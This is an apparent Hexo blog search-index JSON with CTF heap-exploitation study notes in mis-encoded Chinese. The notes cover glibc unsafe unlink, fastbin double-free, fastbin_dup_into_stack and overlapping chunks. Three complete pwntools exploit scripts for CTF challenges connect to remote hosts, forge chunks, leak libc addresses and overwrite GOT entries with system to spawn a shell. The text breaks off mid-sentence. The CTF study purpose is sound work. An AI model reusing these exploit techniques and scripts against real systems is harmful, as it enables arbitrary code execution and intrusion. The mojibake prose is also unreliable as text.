{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"categories","date":"2025-08-28T05:46:22.000Z","updated":"2025-08-28T05:46:22.452Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2025-08-28T05:44:36.000Z","updated":"2025-08-28T05:44:36.850Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Unlink","slug":"Unlink","date":"2025-10-22T16:04:58.000Z","updated":"2025-10-28T09:52:51.113Z","comments":true,"path":"2025/10/23/Unlink/","permalink":"http://example.com/2025/10/23/Unlink/","excerpt":"","text":"unlink çš„ç›®çš„æ˜¯æŠŠä¸€ä¸ªå—ä»é“¾è¡¨ä¸­æ‘˜é™¤ï¼Œä¹Ÿå°±æ˜¯â€œè§£é“¾â€ã€‚ unlink è§¦å‘çš„å…¸å‹æƒ…å†µæ˜¯ï¼šå½“å †ä¸­çš„ chunk è¢«é‡Šæ”¾å¹¶åˆå¹¶ï¼ˆconsolidateï¼‰æ—¶ï¼Œglibc ä¸ºäº†ç»´æŠ¤åŒå‘é“¾è¡¨ç»“æ„ï¼Œéœ€è¦ä» bin ä¸­ç§»é™¤ä¸€ä¸ª chunkï¼Œè€Œè¿™æ—¶å°±ä¼šè°ƒç”¨ unlink å®ã€‚ ğŸ“Œ 2. å“ªäº›æƒ…å†µä¸‹ä¼šè§¦å‘ unlink âœ… Case 1ï¼šåˆå¹¶æ—¶ï¼ˆconsolidationï¼‰ 1free(p); å¦‚æœ p åé¢çš„ chunk ä¹Ÿæ˜¯ free çš„ï¼ˆå³æ²¡æœ‰ PREV_INUSE ä½ï¼‰ï¼Œå°±ä¼šå°è¯•åˆå¹¶å‰åçš„ chunkã€‚ æ­¤æ—¶ï¼Œåä¸€ä¸ª chunk å·²ç»è¢«åŠ å…¥ binï¼Œä¸ºäº†åˆå¹¶ï¼Œè¦å…ˆä» bin ä¸­ç§»é™¤å®ƒ â€”â€”&gt; è§¦å‘ unlink âœ… Case 2ï¼šmalloc_consolidate()ï¼ˆfastbin consolidationï¼‰ malloc() æ—¶ï¼Œå¦‚æœ fastbin æ»¡äº†ï¼Œæˆ–è§¦å‘æŸç§æ¡ä»¶ï¼ˆå¦‚ top chunk å¤ªå°ï¼‰ï¼Œglibc ä¼šè°ƒç”¨ï¼š 1malloc_consolidate() è¿™ä¸ªå‡½æ•°ä¼šæŠŠ fastbin çš„å¤šä¸ª chunk åˆå¹¶å…¥ unsorted binï¼Œä¹Ÿå¯èƒ½å¯¹é‚»æ¥ chunk åšåˆå¹¶ â€”â€”&gt; ä¹Ÿä¼šè§¦å‘ unlink âœ… Case 3ï¼šé‡Šæ”¾ large chunk ä¹‹åå†åˆå¹¶ å¦‚æœé‡Šæ”¾ä¸€ä¸ª large chunkï¼ˆé fastbinï¼‰ï¼Œå®ƒä¼šè¢«æ”¾å…¥ large binï¼Œä¹‹ååˆåˆ†é…&#x2F;é‡Šæ”¾äº†ç›¸é‚» chunkï¼Œå¯èƒ½å¯¼è‡´å†æ¬¡åˆå¹¶ â€”â€”&gt; è§¦å‘ unlink unlinkçš„æ•´ä½“åˆ©ç”¨æ€è·¯ä¸º â‘ ã€åˆ©ç”¨æº¢å‡ºä¼ªé€ fake_chunk â‘¡ã€freeæ‰å¼•çº¿å †å—ï¼ˆä¹Ÿå°±æ˜¯è¢«æº¢å‡ºä¿®æ”¹prev_sizeå’Œsizeçš„chunkï¼‰ï¼Œä»è€Œè§¦å‘unlinkï¼ˆæ³¨æ„chunkåˆ«è·Ÿtop chunkåˆå¹¶äº†ï¼‰ï¼ŒåŒæ—¶å¼•çº¿å †å—çš„å¤§å°ä¸€å®šè¦å¤§äºç­‰äº0x80ï¼Œé¿å…è¢«freeæ‰ç»™æ”¾è¿›äº†fastbinä¸­ã€‚ å› ä¸º fastbinï¼ˆä»¥åŠç°ä»£çš„ tcacheï¼‰èµ°çš„æ˜¯â€œå•é“¾è¡¨&#x2F;å¿«é€Ÿå…¥é˜Ÿâ€è·¯å¾„â€”â€”é‡Šæ”¾æ—¶ä¸ä¼šæ‰§è¡Œä¼ ç»Ÿçš„åŒå‘é“¾è¡¨ unlink æ“ä½œï¼ˆä¹Ÿå°±æ²¡æœ‰ FD-&gt;bk &#x3D; BK &#x2F; BK-&gt;fd &#x3D; FD é‚£ä¸¤æ¬¡å†™ï¼‰ã€‚è¦è§¦å‘ old-style unlinkï¼Œchunk å¿…é¡»è¿›å…¥ unsorted&#x2F;small binï¼ˆåŒé“¾è¡¨ï¼‰è·¯å¾„ï¼Œæ‰ä¼šè§¦å‘é‚£ä¸¤æ¬¡å†™ã€‚å› æ­¤é€šè¿‡æŠŠä¼ªé€  chunk çš„ size è®¾ç½®æˆ â‰¥ å¿«é€Ÿ bin çš„æœ€å¤§å°ºå¯¸ï¼ˆé€šå¸¸ 0x80 åœ¨ 64 ä½ glibc ä¸Šï¼‰ï¼Œå¯ä»¥é¿å…è¢«æ”¾å…¥ fastbinï¼Œä»è€Œä¿è¯ free ä¼šèµ°åˆ°ä¼šè¿›è¡Œ unlink çš„åˆ†æ”¯ã€‚ â‘¢ã€æœ€åæ•ˆæœä¸ºfake_chunkçš„åœ°å€æ”¹ä¸º&amp;P-0x18 â‘£ã€é€šè¿‡editåŠŸèƒ½ä¿®æ”¹bssæ®µå­˜æ”¾çš„chunkä¿¡æ¯ï¼Œè¿›è¡Œæ³„éœ²å‡½æ•°çœŸå®åœ°å€ä»¥åŠç¯¡æ”¹å‡½æ•°çš„gotè¡¨ï¼Œä»è€Œè·å–shell P æ˜¯è¦ä»é“¾è¡¨ä¸­æ‘˜ä¸‹çš„ chunk è€libcæ— æ£€éªŒç‰ˆæœ¬å…ˆè¯»å‡º FD = P-&gt;fd å’Œ BK = P-&gt;bkï¼Œç„¶åä¿®æ”¹ FD-&gt;bk ä¸ BK-&gt;fdï¼Œä½¿å‰åä¸¤å—ç›´æ¥äº’è¿ï¼Œä»è€ŒæŠŠ P è·³è¿‡ã€‚è‹¥æ”»å‡»è€…èƒ½æ§åˆ¶ P-&gt;fd&#x2F;P-&gt;bkï¼Œé‚£ä¸¤æ¬¡å†™æ“ä½œå°±å˜æˆäº† ä»»æ„åœ°å€å†™ï¼ˆå†™å…¥ BKã€FD çš„å€¼åˆ°ä»»æ„åœ°å€ï¼‰ï¼Œè¿™æ­£æ˜¯ unsafe unlink åˆ©ç”¨ç‚¹ã€‚(èµ‹å€¼) 1234567/* ä¸å®‰å…¨ç‰ˆï¼ˆæ¦‚å¿µä¸Šç­‰åŒäºæ—§ glibc çš„å®å®ç°ï¼‰ */#define UNSAFE_UNLINK(P, BK, FD) do &#123; \\ FD = (P)-&gt;fd; /* è¯»å– P-&gt;fdï¼ˆæŒ‡å‘åç»§ï¼‰ */ \\ BK = (P)-&gt;bk; /* è¯»å– P-&gt;bkï¼ˆæŒ‡å‘å‰é©±ï¼‰ */ \\ FD-&gt;bk = BK; /* (P-&gt;fd)-&gt;bk = P-&gt;bk */ \\ BK-&gt;fd = FD; /* (P-&gt;bk)-&gt;fd = P-&gt;fd */ \\&#125; while (0) ç›´æ¥è¿›è¡Œèµ‹å€¼æ“ä½œ 12*(fd+0x18)=bk*(bk+0x10)=fd eg: 12FD = second_fd = free_GOT - 0x18BK = second_bk = shellcode_address ä½¿å¾—è°ƒç”¨freeçš„æ—¶å€™å¯ä»¥ç›´æ¥ç”¨shellcode åŠ æ ¡éªŒåœ¨æ‰§è¡Œå†™ä¹‹å‰å…ˆéªŒè¯é“¾è¡¨ä¸€è‡´æ€§ï¼šFD-&gt;bk å¿…é¡»æŒ‡å› Pï¼Œä¸” BK-&gt;fd ä¹Ÿå¿…é¡»æŒ‡å› Pã€‚ è‹¥æ”»å‡»è€…ä¼ªé€  fd&#x2F;bkï¼Œé€šå¸¸æ— æ³•åŒæ—¶æ»¡è¶³è¿™ä¸¤é¡¹ï¼Œå› æ­¤æ£€æŸ¥å¤±è´¥ä¼š abort()ï¼Œé˜»æ­¢åˆ©ç”¨ã€‚è¿™æ˜¯ unsafe unlink è¢«å¹¿æ³›ç¼“è§£çš„å…³é”®æ”¹åŠ¨ä¹‹ä¸€ï¼ˆä¸è¿‡æ”»å‡»è€…å¯ç”¨æ›´å¤æ‚çš„æŠ€æœ¯ç»•è¿‡æ£€æŸ¥ï¼Œæˆ–åœ¨æ›´æ—§çš„ libc ä¸Šåˆ©ç”¨ï¼‰ã€‚ 123456789# å¸¦ä¸€è‡´æ€§æ£€æŸ¥çš„å®‰å…¨ç‰ˆæœ¬ï¼ˆé€»è¾‘ä¸ glibc åæ¥åŠ å…¥çš„æ£€æŸ¥ä¸€è‡´ï¼‰ #define SAFE_UNLINK(P, BK, FD) do &#123; FD = (P)-&gt;fd; BK = (P)-&gt;bk; if (FD-&gt;bk != (P) || BK-&gt;fd != (P)) malloc_printerr(&quot;corrupted double-linked list&quot;); FD-&gt;bk = BK; BK-&gt;fd = FD; &#125; while (0) æ­¤æ—¶å°±ä¸èƒ½ç›´æ¥è¿›è¡Œèµ‹å€¼æ“ä½œ ä½†æ˜¯çœ‹å¯ä»¥è¿›è¡Œä»»æ„åœ°å€å†™å…¥ åˆ©ç”¨å­˜åœ¨uafæ¼æ´æˆ–è€…ï¼ˆå †æº¢å‡ºï¼‰å¯ä»¥æ”¹å†™freeæ—¶çš„smallbinæˆ–unsorted bin çš„fdå’Œbk æ•ˆæœï¼šè®©chunk[0]æŒ‡å‘chunk[-3] egï¼š 1234567fd=tar-0x18bk=tar-0x10#ç¬¦åˆæ ¡éªŒ*(fd+0x18)=*(bk+0x10)=tar#èµ‹å€¼*(fd+0x18)=tar=*(bk-0x10)*(bk+0x10)=tar=*(fd-0x18) ä¾‹é¢˜1hitcontraining_bamboobox add edit è‡ªå·±æ§åˆ¶è¾“å…¥é•¿åº¦ï¼Œå­˜åœ¨å †æº¢å‡º free å…¨éƒ¨ç½®é›¶ï¼Œæ²¡æœ‰uafæ¼æ´ show å¯ç›´æ¥è¾“å‡ºå †å—å†…å®¹ æ€è·¯1.ç”¨libc3æ€è·¯ï¼Œåˆ›å»º3ä¸ªå †å—ï¼Œ0ç”¨æ¥ä¼ªé€ å †å—ï¼Œ1è§¦å‘unlink, 2é˜²æ­¢ä¸top_chunkåˆå¹¶ï¼Œï¼ˆæ³¨æ„ï¼Œå †å—fake_heapä¸1åˆå¹¶çš„æ—¶å€™ä¸è¦ä»Šå…¥fast_binï¼Œä»–æ˜¯å•é“¾è¡¨ç®¡ç†ï¼‰ã€‚é€šè¿‡ä¿®æ”¹0æ¥ä¼ªé€ ä¸€ä¸ªå‡çš„å †å—ç„¶åfree1è§¦å‘unlinkè®©1ä¸2åˆå¹¶ï¼Œå¹¶ä¸”å¯¹å‡å †å—ä¸Šçš„fdå’Œbkè¿›è¡Œèµ‹å€¼ä¿®æ”¹ 123456789tar=0x6020C8add(0x30,b&quot;fake_heap&quot;)add(0x80,b&quot;111111111&quot;)add(0x80,b&quot;333333333&quot;)pay=p64(0)+p64(0x31)+p64(tar-0x18)+p64(tar-0x10)+p64(0)*2pay+=p64(0x30)+p64(0x90)edit(0,len(pay),pay)delete(1) ä¿®æ”¹æŒ‡é’ˆå‰ï¼š æ­¤æ—¶å·²ç»è¿›è¡Œäº†èµ‹å€¼ä¿®æ”¹æ“ä½œäº†ï¼Œtaræœ€åè¢«æ”¹ä¸ºäº†tar-0x18ä½ç½®ï¼Œä¹Ÿå°±æ˜¯è¯´heap_user[0]æ­¤æ—¶æŒ‡å‘heap_user[-3]çš„ä½ç½®ï¼Œæ‰€ä»¥æ­¤æ—¶è¦åŠ ä¸‰ä¸ªå¡«å……å»å«é«˜åœ°å€å†å†™å…¥atio,é‚£ä¹ˆæ­¤æ—¶å°±è¢«èµ‹å€¼ä¸ºäº†atio_gotï¼Œå¦‚å›¾è¯¥å¤„çš„å†…å®¹æ­¤æ—¶ä¸ºgotè¡¨çš„ç‰©ç†åœ°å€ 123456atoi_got=elf.got[&#x27;atoi&#x27;]payload = p64(0) *2+p64(0x40)+ p64(atoi_got)edit(0,len(payload),payload)show()atoi=u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;) )log.success(&quot;atoi:&quot;+hex(atoi)) æœ€åæŠŠå®ƒçš„gotè¡¨åœ°å€èµ‹å€¼ä¸ºsystemå‡½æ•°åœ°å€ï¼Œç„¶åä¼ å…¥å‚æ•° 1234libc_base=atoi-libc.sym[&#x27;atoi&#x27;]system=libc_base+libc.sym[&#x27;system&#x27;]edit(0,8,p64(system))sla(&#x27;Your choice:&#x27;,&#x27;/bin/sh\\x00&#x27;) edit(0)ä»å †å—0çš„åœ°å€ä¸­å–å‡ºgotè¡¨æŠŠå¯¹åº”åœ°å€æ”¹ä¸ºsystemå‡½æ•°çš„åœ°å€ äºŒè€…éƒ½æ˜¯ä¿®æ”¹æŒ‡é’ˆä½ç½® EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import *import sysfrom LibcSearcher import *file_path = &quot;./12&quot;remote_host = &quot;node5.buuoj.cn&quot;remote_port = 26935context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)context.terminal = [ &quot;cmd.exe&quot;, &quot;/c&quot;, &quot;start&quot;, &quot;/max&quot;, &quot;&quot;, &quot;wt.exe&quot;, &quot;--profile&quot;, &quot;WSL GDB (Black)&quot;, &quot;--&quot;, &quot;wsl&quot;, &quot;bash&quot;, &quot;-lc&quot;]elf = ELF(file_path)libc = elf.libcif &#x27;re&#x27; in sys.argv: p = remote(remote_host, remote_port)else: p = process(file_path) #gdb.attach(p,&quot;b*&quot;)def debug(): gdb.attach(p) pause() def sla(a, b): p.sendlineafter(a, b)def ru(a): p.recvuntil(a)def sa(a, b): p.sendafter(a, b)def add(size,content): p.sendlineafter(&#x27;Your choice:&#x27;,&#x27;2&#x27;) p.sendlineafter(&#x27;name:&#x27;,str(size)) p.sendafter(&#x27;item:&#x27;,content)def show(): p.sendlineafter(&#x27;Your choice:&#x27;,&#x27;1&#x27;)def edit(idx,size,content): p.sendlineafter(&#x27;Your choice:&#x27;,&#x27;3&#x27;) p.sendafter(&#x27;item:&#x27;,str(idx)) p.sendlineafter(&#x27;name:&#x27;,str(size)) p.sendafter(&#x27;item:&#x27;,content)def delete(idx): p.sendlineafter(&#x27;Your choice:&#x27;,&#x27;4&#x27;) p.sendafter(&#x27;item:&#x27;,str(idx))tar=0x6020C8add(0x30,b&quot;fake_heap&quot;)add(0x80,b&quot;111111111&quot;)add(0x80,b&quot;333333333&quot;)pay=p64(0)+p64(0x31)+p64(tar-0x18)+p64(tar-0x10)+p64(0)*2pay+=p64(0x30)+p64(0x90)edit(0,len(pay),pay)delete(1)atoi_got=elf.got[&#x27;atoi&#x27;]payload = p64(0) *2+p64(0x40)+ p64(atoi_got)edit(0,len(payload),payload)show()atoi=u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;) )log.success(&quot;atoi:&quot;+hex(atoi))libc_base=atoi-libc.sym[&#x27;atoi&#x27;]system=libc_base+libc.sym[&#x27;system&#x27;]edit(0,8,p64(system))sla(&#x27;Your choice:&#x27;,&#x27;/bin/sh\\x00&#x27;)p.interactive() ä¾‹é¢˜2[SUCTF 2018 æ‹›æ–°èµ›]unlink æ€è·¯å…ˆä¼ªé€ ä¸€ä¸ªæ ˆï¼Œç„¶åfreeè§¦å‘unlinkæ¥ä¿®æ”¹æŒ‡é’ˆã€‚ä¹‹åæ”¹chunk0çš„å†…å®¹ä¸ºbâ€&#x2F;bin&#x2F;sh\\x00â€+p64(0)*2+p64(0x6020a8)+p64(free_got)ï¼Œå­—ç¬¦ä¸²ä¸ºsystemå‡½æ•°åšå‡†å¤‡ï¼Œä¸¤ä¸ª0æ˜¯å§ä½ç½®å¡«é«˜ï¼Œp64(0x6020a8)æ˜¯bin&#x2F;shæ‰€åœ¨ä½ç½®ï¼Œé…åˆsystemä½¿ç”¨ï¼Œç„¶åæŠŠchunk1çš„æŒ‡é’ˆæ”¹ä¸ºfreeçš„gotè¡¨åœ°å€ã€‚ show(1)è®¡ç®—libcåŸºç¡€åœ°å€ï¼Œæœ€åæŠŠfreeçš„gotè¡¨åœ°å€æ”¹ä¸ºsystemï¼Œç„¶ådeletè°ƒç”¨å°±æ‰§è¡Œäº†æˆ‘ä»¬æ„é€ çš„åé—¨å‡½æ•° EXP1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889from pwn import *import sysfrom LibcSearcher import *file_path = &quot;./service&quot;remote_host = &quot;1.95.36.136&quot;remote_port = 2110context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)context.terminal = [ &quot;cmd.exe&quot;, &quot;/c&quot;, &quot;start&quot;, &quot;/max&quot;, &quot;&quot;, &quot;wt.exe&quot;, &quot;--profile&quot;, &quot;WSL GDB (Black)&quot;, &quot;--&quot;, &quot;wsl&quot;, &quot;bash&quot;, &quot;-lc&quot;]elf = ELF(file_path)libc = elf.libcif &#x27;re&#x27; in sys.argv: p = remote(remote_host, remote_port)else: p = process(file_path) #gdb.attach(p,&quot;b*&quot;)def dbg(): gdb.attach(p) pause() def sla(a, b): p.sendlineafter(a, b)def ru(a): p.recvuntil(a)def sa(a, b): p.sendafter(a, b)def add(size): p.recvuntil(&#x27;chooice :\\n&#x27;) p.sendline(&#x27;1&#x27;) p.recvuntil(&#x27;size :&#x27;) p.sendline(str(size)) def delete(index): p.recvuntil(&#x27;chooice :\\n&#x27;) p.sendline(&#x27;2&#x27;) p.recvuntil(&#x27;delete\\n&#x27;) p.sendline(str(index)) def show(index): p.recvuntil(&#x27;chooice :\\n&#x27;) p.sendline(&#x27;3&#x27;) p.recvuntil(&#x27;show\\n&#x27;) p.sendline(str(index)) def edit(index, content): p.recvuntil(&#x27;chooice :\\n&#x27;) p.sendline(&#x27;4&#x27;) p.recvuntil(&#x27;modify :\\n&#x27;) p.sendline(str(index)) p.recvuntil(&#x27;input the content&#x27;) p.send(content)add(0x30)add(0x80)add(0x20)tar=0x6020C0pay=p64(0)+p64(0x30)+p64(tar-0x18)+p64(tar-0x10)+p64(0)*2pay+=p64(0x30)+p64(0x90)edit(0,pay)delete(1)free_got=elf.got[&#x27;free&#x27;]pay=b&quot;/bin/sh\\x00&quot;+p64(0)*2+p64(0x6020a8)+p64(free_got)edit(0,pay)show(1)free=u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(hex(free))libc_base=free-libc.sym[&#x27;free&#x27;]system_addr=libc_base+libc.sym[&#x27;system&#x27;]binsh_addr=libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))edit(1,p64(system_addr))delete(0)p.interactive() polarä¾‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576from pwn import *import sysfrom LibcSearcher import *file_path = &quot;./pwn1&quot;remote_host = &quot;1.95.36.136&quot;remote_port = 2066context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)context.terminal = [ &quot;cmd.exe&quot;, &quot;/c&quot;, &quot;start&quot;, &quot;/max&quot;, &quot;&quot;, &quot;wt.exe&quot;, &quot;--profile&quot;, &quot;WSL GDB (Black)&quot;, &quot;--&quot;, &quot;wsl&quot;, &quot;bash&quot;, &quot;-lc&quot;]elf = ELF(file_path)libc = elf.libcif &#x27;re&#x27; in sys.argv: p = remote(remote_host, remote_port)else: p = process(file_path) #gdb.attach(p,&quot;b*&quot;)def dbg(): gdb.attach(p) pause() def sla(a, b): p.sendlineafter(a, b)def ru(a): p.recvuntil(a)def sa(a, b): p.sendafter(a, b)def add(index, size): sla(b&#x27;&gt; &#x27;, b&#x27;1&#x27;) sla(b&#x27;Index: &#x27;, str(index).encode()) sa(b&#x27;Size:&#x27;, str(size).encode())def edit(index, content): sla(b&#x27;&gt; &#x27;, b&#x27;2&#x27;) sla(b&#x27;Index: &#x27;, str(index).encode()) sa(b&#x27;Content: &#x27;, content)def delete(index): sla(b&#x27;&gt; &#x27;, b&#x27;3&#x27;) sla(b&#x27;Index: &#x27;, str(index).encode())chunk=0x06020C0add(0,0x30)add(1,0x80)add(2,0x20)payload=p64(0)+p64(0x31)+p64(chunk-0x18)+p64(chunk-0x10)+p64(0)*2+p64(0x30)+p64(0x90)edit(0,payload)delete(1)free_got=elf.got[&#x27;free&#x27;]puts_plt=elf.plt[&#x27;puts&#x27;]puts_got=elf.got[&#x27;puts&#x27;]pay=b&quot;/bin/sh\\x00&quot;+p64(0)*2+p64(puts_got)+p64(free_got)+p64(0x6020a8)edit(0,pay)edit(1,p64(puts_plt))delete(0)puts=u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(&quot;puts:&quot;,hex(puts))libc_base=puts-libc.symbols[&#x27;puts&#x27;]print(&quot;libc_base:&quot;,hex(libc_base))system_addr=libc_base+libc.symbols[&#x27;system&#x27;]bin_sh_addr=libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))print(&quot;system_addr:&quot;,hex(system_addr))edit(1,p64(system_addr))delete(2)p.interactive()","categories":[{"name":"heap_study","slug":"heap-study","permalink":"http://example.com/categories/heap-study/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"},{"name":"unlink","slug":"unlink","permalink":"http://example.com/tags/unlink/"}]},{"title":"fast_bin","slug":"fast-bin","date":"2025-10-01T05:14:12.000Z","updated":"2025-10-09T04:12:01.767Z","comments":true,"path":"2025/10/01/fast-bin/","permalink":"http://example.com/2025/10/01/fast-bin/","excerpt":"","text":"0x555555559000: 0x0000000000000000 â† prev_sizeï¼ˆä¸Šä¸€ä¸ª chunk å¤§å°ï¼›æ­¤å¤„ç”¨ä¸åˆ°ï¼‰0x555555559008: 0x0000000000000021 â† size &#x3D; 0x20 | PREV_INUSE0x555555559010: 0x0000555555559020 â† ç”¨æˆ·åŒºå‰ 8 å­—èŠ‚ &#x3D; fastbin fdï¼ˆæŒ‡å‘ä¸‹ä¸€ç»“ç‚¹ï¼‰0x555555559018: 0x0000000000000000 â† ç”¨æˆ·åŒºå…¶ä½™æ•°æ®ï¼ˆæ­¤åˆ»ä¸º 0ï¼‰ double_freeç”³è¯·ä¸‰å—åŒå°ºå¯¸ï¼šA, B, Cã€‚ free(A)ï¼›free(B)ï¼›ç»•è¿‡â€œtop-of-binâ€æ£€æŸ¥åå† free(A)ï¼ˆç°åœ¨é“¾è¡¨å‡ºç°ä¸¤ä¸ª A çš„å¼•ç”¨ï¼Œç­‰ä»·äºâ€œæŠŠ A æ”¾äº†ä¸¤æ¬¡â€ï¼‰ã€‚ ä¸‹ä¸€æ¬¡ malloc å–å› A åï¼Œä½ å¯ä»¥æ”¹å†™è¿™ä¸ªå—ä¸­çš„ fd å­—æ®µï¼Œè®©å®ƒæŒ‡å‘â€œç›®æ ‡åœ°å€é™„è¿‘ï¼ˆæ»¡è¶³å¯¹é½ä¸”å‡å»å¤´å¤§å°åçš„åœ°å€ï¼‰â€ã€‚ è¿ç»­å† malloc æ•°æ¬¡ï¼šå…ˆåƒæ‰é“¾è¡¨ä¸­çš„â€œå‡ç»“ç‚¹â€ï¼Œæœ€ç»ˆå¾—åˆ°ä¸€ä¸ªæŒ‡å‘ç›®æ ‡åœ°å€çš„ä¼ª chunkï¼Œå®ç°â€œä»»æ„åœ°å€é™„è¿‘è·å¾—å¯å†™å—â€â†’ å†å†™æ•æ„ŸæŒ‡é’ˆï¼ˆå¦‚å‡½æ•°æŒ‡é’ˆã€vtableã€hookï¼‰ã€‚ ä¹Ÿå°±æ˜¯è¯´å¯ä»¥é€šè¿‡æ”¹å˜ä¸€ä¸ªï¼Œç„¶åè°ƒç”¨è¿™ä¸ªä½¿ç”¨æ”¹å˜çš„ fastbin_dup_into_stack ç”³è¯·ä¸‰å—åŒå°ºå¯¸ï¼ˆè¯·æ±‚ 8 å­—èŠ‚ï¼Œå®é™…å¯¹é½åˆ° 0x20 ç±»åˆ«ï¼‰ï¼šå¾—åˆ°ç”¨æˆ·æŒ‡é’ˆ a,b,cã€‚ free(a) â†’ fastbin é“¾å˜æˆ [A]ï¼ˆA çš„ fd å†™åœ¨ a æŒ‡å‘çš„ 8 å­—èŠ‚å¤„ï¼‰ã€‚ free(b) â†’ é“¾ä¸º [B, A]ã€‚ å† free(a)ï¼ˆæ­¤æ—¶ A ä¸åœ¨é“¾è¡¨å¤´ï¼‰â†’ é“¾ä¸º [A, B, A]ï¼Œè¿™å°±æ˜¯ dupï¼ˆåŒä¸€ç‰©ç†å— A å‡ºç°ä¸¤æ¬¡ï¼‰ã€‚ æ­¤æ—¶ä» fastbin å¼¹ä¸¤æ¬¡ï¼š d = malloc(8)ï¼šæ‹¿åˆ°é“¾è¡¨å¤´ A çš„ç”¨æˆ·æŒ‡é’ˆï¼Œæ‰€ä»¥ d == aã€‚ malloc(8)ï¼šæ‹¿åˆ° Bã€‚ é“¾é‡Œåªå‰©ä¸‹ä¸€ä¸ª Aï¼š[A]ã€‚ é‡ç‚¹ï¼šä½ æ‰‹é‡Œè¿˜æ‹¿ç€ d=a è¿™æ ¹æŒ‡é’ˆï¼Œå®ƒæŒ‡å‘ A çš„ç”¨æˆ·åŒºå¼€å¤´ï¼Œä¹Ÿå°±æ˜¯fastbin çš„ fd æ‰€åœ¨å¤„ã€‚ æ‰€ä»¥ä½ å†™ *d = ...ï¼Œå®é™…ä¸Šå°±æ˜¯åœ¨æ”¹ A çš„ fdï¼ å¯ä»¥çœ‹åˆ°ï¼ˆmallocï¼‰è¿”å›çš„æŒ‡é’ˆæ˜¯userçš„å†…å­˜ç©ºé—´åœ°å€ï¼Œä¸”fdå¤„å­˜å…¥çš„æŒ‡é’ˆä¹Ÿæ˜¯pre_sizeå­—æ®µçš„åœ°å€ è®°ä½ï¼š**fastbin çš„ fd å°±æ˜¯â€œè¢« free çš„ chunk çš„ç”¨æˆ·åŒºå‰ 8 å­—èŠ‚â€ã€‚**å› ä¸º d æŒ‡å‘ç”¨æˆ·åŒºé¦–åœ°å€ï¼Œ*d å°±æ”¹äº† fdã€‚ ç„¶åå‘æ ˆ (stack) å†™å…¥ä¸€ä¸ªä¼ªé€ çš„ç©ºé—²å—å¤§å°ï¼ˆåœ¨æœ¬ä¾‹ä¸­ä¸º 0x20ï¼‰ï¼Œä»¥ä¾¿ malloc ä¼šè®¤ä¸ºé‚£é‡Œæœ‰ä¸€ä¸ªç©ºé—²å—å¹¶åŒæ„ 123stack_var = 0x20;#ä¼ªé€ æ ˆå¤§å°*d = (unsigned long long)(((char*)&amp;stack_var) - sizeof(d));//è¿™ä¸ªdå°±æ˜¯fdæŒ‡é’ˆå¤„ï¼Œ((char*)&amp;stack_var)æ˜¯å†™å…¥0x20çš„æ ˆçš„ä½ç½®ï¼Œç›¸å½“äºsizeå­—æ®µï¼Œæ‰€ä»¥è¿™ä¸ªä¼ªå—çš„å¤´åœ°å€æ˜¯pre_sizeå­—æ®µï¼Œæ‰€ä»¥å–å…¶å‡8çš„åœ°å€å¤„ fastbin_dup_consolidateåˆ©ç”¨ malloc_consolidate + ä¸€æ¬¡å†å²å°å—çš„ double-freeï¼Œæ‹¿åˆ°åŒä¸€å¤§å—çš„ä¸¤ä»½å¼•ç”¨ï¼ˆUAF&#x2F;dupï¼‰â€ å…ˆæŠŠä¸€ä¸ªå° fastbin å— free åˆ° bins é‡Œâ€”â€”&gt; è§¦å‘ consolidate æŠŠå®ƒå¹¶è¿› topï¼Œ ç´§æ¥ç€ä» top åˆ‡ä¸€å—å¤§å—å›æ¥ï¼Œèµ·å§‹åœ°å€æ­£å¥½ç­‰äºå½“å¹´çš„å°å—åœ°å€ã€‚æ­¤æ—¶ä½ æ‰‹é‡Œæ—§æŒ‡é’ˆ p1 å’Œæ–°åˆ†é…çš„å¤§å— p3 åœ°å€ç›¸ç­‰ï¼›å†å¯¹ p1 åšä¸€æ¬¡ freeï¼Œå°±æŠŠâ€œä»åœ¨ç”¨çš„ p3â€ç»™ free æ‰ï¼Œåˆ¶é€ å‡º UAFï¼›æ¥ç€å† malloc ä¸€æ¬¡åŒå°ºå¯¸ï¼Œå¾—åˆ° p4 &#x3D;&#x3D; p3ï¼Œå®ç°ä¸€å—å†…å­˜è¢«ä¸¤ä¸ªæ´»è·ƒå˜é‡å…±äº«çš„â€œduplicationâ€ 12345void* p1 = calloc(1,0x40)free(p1)#ä¼šè¢«åˆå¹¶åˆ°top chunkvoid* p3 = malloc(0x400)#æŒ‡é’ˆä½ç½®å’Œp1ç›¸åŒfree(p1)#ç›¸å½“äºé‡Šæ”¾çš„p3void *p4 = malloc(0x400);#p3 p4çš„æŒ‡é’ˆç›¸åŒ overlapping_chunkssize_changeé€šè¿‡ç¯¡æ”¹å·²é‡Šæ”¾å—çš„ size**ï¼Œè®©ä¸‹ä¸€æ¬¡ malloc ä» unsorted bin é‡ŒæŒ‰ä½ ä¼ªé€ çš„å¤§å°åˆ‡å—ï¼Œç»“æœæ–°å— p4 çš„èŒƒå›´ä¸ç°å­˜å— p3 å‘ç”Ÿç‰©ç†é‡å ã€‚æœ‰äº†é‡å ï¼Œå°±èƒ½åšåˆ°â€œå†™ p4 â†’ æ”¹åˆ° p3ï¼Œæˆ–å†™ p3 